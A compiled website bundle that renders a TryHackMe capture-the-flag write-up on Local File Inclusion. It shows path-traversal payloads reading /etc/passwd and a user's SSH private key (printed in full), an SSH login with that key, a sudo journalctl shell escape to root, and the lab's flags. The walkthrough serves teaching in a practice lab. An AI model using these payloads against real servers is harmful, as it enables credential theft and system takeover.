"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7623],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>h});var a=t(67294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function r(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,a,i=function(e,n){if(null==e)return{};var t,a,i={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var l=a.createContext({}),u=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):r(r({},n),e)),t},p=function(e){var n=u(e.components);return a.createElement(l.Provider,{value:n},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),c=u(t),m=i,h=c["".concat(l,".").concat(m)]||c[m]||d[m]||o;return t?a.createElement(h,r(r({ref:n},p),{},{components:t})):a.createElement(h,r({ref:n},p))}));function h(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var o=t.length,r=new Array(o);r[0]=m;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[c]="string"==typeof e?e:i,r[1]=s;for(var u=2;u<o;u++)r[u]=t[u];return a.createElement.apply(null,r)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},42478:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>u});var a=t(87462),i=(t(67294),t(3905));const o={},r="LFI",s={unversionedId:"Tryhackme/LFI/UFI",id:"Tryhackme/LFI/UFI",title:"LFI",description:"Understand and exploit a web server that is vulnerable to the Local File Inclusion (LFI) vulnerability.",source:"@site/writeups/Tryhackme/LFI/UFI.md",sourceDirName:"Tryhackme/LFI",slug:"/Tryhackme/LFI/UFI",permalink:"/writeups/Tryhackme/LFI/UFI",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"kiba",permalink:"/writeups/Tryhackme/Kiba/"},next:{title:"LFI Basics",permalink:"/writeups/Tryhackme/LFI Basics/"}},l={},u=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy",id:"task-1-deploy",level:2},{value:"Task 2 Getting user access via LFI",id:"task-2-getting-user-access-via-lfi",level:2},{value:"Task 3 Escalating your privileges to root",id:"task-3-escalating-your-privileges-to-root",level:2}],p={toc:u},c="wrapper";function d(e){let{components:n,...t}=e;return(0,i.kt)(c,(0,a.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"lfi"},"LFI"),(0,i.kt)("p",null,"Understand and exploit a web server that is vulnerable to the Local File Inclusion (LFI) vulnerability."),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/lfi"},"LFI")),(0,i.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Local File Inclusion"),(0,i.kt)("li",{parentName:"ul"},"Directory Traversal"),(0,i.kt)("li",{parentName:"ul"},"Misconfigured Binaries (/bin/journalctl)")),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"task-1-deploy"},"Task 1 Deploy"),(0,i.kt)("p",null,"Local File Inclusion (LFI) is the vulnerability that is mostly found in web servers. This vulnerability is exploited when a user input contains a certain path to the file which might be present on the server and will be included in the output. This kind of vulnerability can be used to read files containing sensitive and confidential data from the vulnerable system."),(0,i.kt)("p",null,"The main cause of this type of Vulnerability is improper sanitization of the user's input. Sanitization here means that whatever user input should be checked and it should be made sure that only the expected values are passed and nothing suspicious is given in input. It is a type of Vulnerability commonly found in PHP based websites but isn't restricted to them."),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Deploy the VM and access its web server: http://MACHINE_IP")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,i.kt)("h2",{id:"task-2-getting-user-access-via-lfi"},"Task 2 Getting user access via LFI"),(0,i.kt)("p",null,"To test for LFI what we need is a parameter on any URL or any other input fields like request body etc. For example, if the website is tryhackme.com then a parameter in the URL can look like ",(0,i.kt)("a",{parentName:"p",href:"https://tryhackme.com/?file=robots.txt"},"https://tryhackme.com/?file=robots.txt"),". Here file is the name of the parameter and robots.txt is the value that we are passing (include the file robots.txt)."),(0,i.kt)("p",null,"Importance of Arbitrary file reading"),(0,i.kt)("p",null,"A lot of the time LFI can lead to accessing (without the proper permissions) important and classified data. An attacker can use LFI to read files from your system which can give away sensitive information such as passwords/SSH keys; enumerated data can be further used to compromise the system."),(0,i.kt)("p",null,"In this task, we are going to find the parameter which is vulnerable to the Local File Inclusion attack. We will then will try to leverage information obtained to get access to the system."),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Look around the website. What is the name of the parameter you found on the website?")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"page")),(0,i.kt)("ol",{start:2},(0,i.kt)("li",{parentName:"ol"},"Once we find the vulnerable parameter we can try to include the passwd file on the Linux system i.e /etc/passwd. The most common technique is path traversal method meaning we can include files like ",(0,i.kt)("inlineCode",{parentName:"li"},"../../../../etc/passwd")," what this does it get out of a directory like we usually do in Linux system by running ",(0,i.kt)("inlineCode",{parentName:"li"},"cd ../"))),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"../../etc/passwd")," means to go out twice from the current working directory and then go to ",(0,i.kt)("inlineCode",{parentName:"p"},"/etc")," directory and read the ",(0,i.kt)("inlineCode",{parentName:"p"},"passwd")," file. Now the issue with this method is you need to be sure about the path of the file."),(0,i.kt)("p",null,"You can read the ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks"},"interesting files to check out")," while testing for LFI."),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"http://10.10.109.9/home?page=../../../../etc/passwd"},"http://10.10.109.9/home?page=../../../../etc/passwd")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nfalcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,i.kt)("ol",{start:3},(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("p",{parentName:"li"},"Once you include ",(0,i.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," then you should see entries something like:"),(0,i.kt)("p",{parentName:"li"},"root\u274c0:0::/root:/bin/bash\nbin\u274c1:1::/:/sbin/nologin\ndaemon\u274c2:2::/:/sbin/nologin"))),(0,i.kt)("p",null,"To understand all those entries read ",(0,i.kt)("a",{parentName:"p",href:"https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/"},"this")," article."),(0,i.kt)("p",null,"This file can give information about the system like the name of all the existing users on the system."),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,i.kt)("ol",{start:4},(0,i.kt)("li",{parentName:"ol"},"What is the name of the user on the system?")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"falcon")),(0,i.kt)("ol",{start:5},(0,i.kt)("li",{parentName:"ol"},"Once you find the name of the user it's important to see if you can include anything ",(0,i.kt)("strong",{parentName:"li"},"common")," and ",(0,i.kt)("strong",{parentName:"li"},"important")," in that user's directory, could be anything like theirs ",(0,i.kt)("strong",{parentName:"li"},".bashrc")," etc")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,i.kt)("ol",{start:6},(0,i.kt)("li",{parentName:"ol"},"Name of the file which can give you access to falcon's account on the system?")),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"10.10.109.9/home?page=../../home/falcon/.ssh/id_rsa"},"10.10.109.9/home?page=../../home/falcon/.ssh/id_rsa")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi\newnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT\nubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS\nlHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22\ne7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD\nErf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB\nj6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw\nGbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ\n2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D\nw5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9\nVWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM\nPqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+\nERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i\nIIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc\nZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/1MlTXEpFdC+\nVHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A\n1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF\n2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP\njxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw\n2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP\nvv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB\nkNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8\npoHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V\nE/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH\nANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg==\n-----END RSA PRIVATE KEY-----\n")),(0,i.kt)("ol",{start:7},(0,i.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"li@kali:~/CTFs/tryhackme/LFI$ chmod 600 id_rsa\nkali@kali:~/CTFs/tryhackme/LFI$ ssh -i id_rsa falcon@10.10.109.9\nWelcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Nov  7 19:27:05 IST 2020\n\n  System load:  0.0               Processes:           84\n  Usage of /:   30.7% of 9.78GB   Users logged in:     0\n  Memory usage: 15%               IP address for eth0: 10.10.109.9\n  Swap usage:   0%\n\n\n6 packages can be updated.\n3 updates are security updates.\n\n\nLast login: Wed Jan 29 20:13:44 2020 from 192.168.1.107\nfalcon@walk:~$ ls\nuser.txt\nfalcon@walk:~$ cat user.txt\nB8LEGIF049JT4RTVWUG4\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"B8LEGIF049JT4RTVWUG4")),(0,i.kt)("h2",{id:"task-3-escalating-your-privileges-to-root"},"Task 3 Escalating your privileges to root"),(0,i.kt)("p",null,"In this, we are going to focus on getting root-level access on the machine. This step is also known as Privilege escalation; we are going to escalate our privilege from a normal user to a root user (with the highest level of system privileges)."),(0,i.kt)("p",null,"First, we'll have to find a vector that would be exploited to give us root access. A vector can be anything like a binary with some special permission or a cronjob that is not configured properly etc."),(0,i.kt)("p",null,"I've written a blog post about Linux privilege escalation, you can read it ",(0,i.kt)("a",{parentName:"p",href:"https://mzfr.github.io/linux-priv-esc"},"here")," to know more about it."),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"What can falcon run as ",(0,i.kt)("strong",{parentName:"li"},"root"),"?")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"falcon@walk:~$ sudo -l\nMatching Defaults entries for falcon on walk:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser falcon may run the following commands on walk:\n    (root) NOPASSWD: /bin/journalctl\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"/bin/journalctl")),(0,i.kt)("ol",{start:2},(0,i.kt)("li",{parentName:"ol"},"Search gtfobins via the ",(0,i.kt)("a",{parentName:"li",href:"http://gtfobins.github.io/"},"website")," or by using ",(0,i.kt)("a",{parentName:"li",href:"http://github.com/mzfr/gtfo"},"gtfo tool"),", to see if you find any way to use that binary for privilege escalation.")),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/journalctl/"},"https://gtfobins.github.io/gtfobins/journalctl/")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"falcon@walk:~$ sudo journalctl\n-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Sat 2020-11-07 19:29:51 IST. --\nJan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 (Ubuntu 4.15.0-20.21-gen\nJan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=UUID=979754d8-4db7-4b66-a804-28a498c1cc0f ro\nJan 28 19:00:21 walk kernel: KERNEL supported cpus:\nJan 28 19:00:21 walk kernel:   Intel GenuineIntel\nJan 28 19:00:21 walk kernel:   AMD AuthenticAMD\nJan 28 19:00:21 walk kernel:   Centaur CentaurHauls\nJan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'\nJan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'\nJan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'\nJan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256\nJan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.\nJan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:\nJan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable\n!/bin/sh\n# whoami\nroot\n# cd /root\n# ls\nroot.txt\n# cat root.txt\nH1EQRK5XEX140H2KMO08\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,i.kt)("ol",{start:3},(0,i.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"H1EQRK5XEX140H2KMO08")),(0,i.kt)("ol",{start:4},(0,i.kt)("li",{parentName:"ol"},"Why not complete the ",(0,i.kt)("a",{parentName:"li",href:"https://tryhackme.com/room/inclusion"},"LFI beginner level challenge")," next?")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"No answer needed")))}d.isMDXComponent=!0}}]);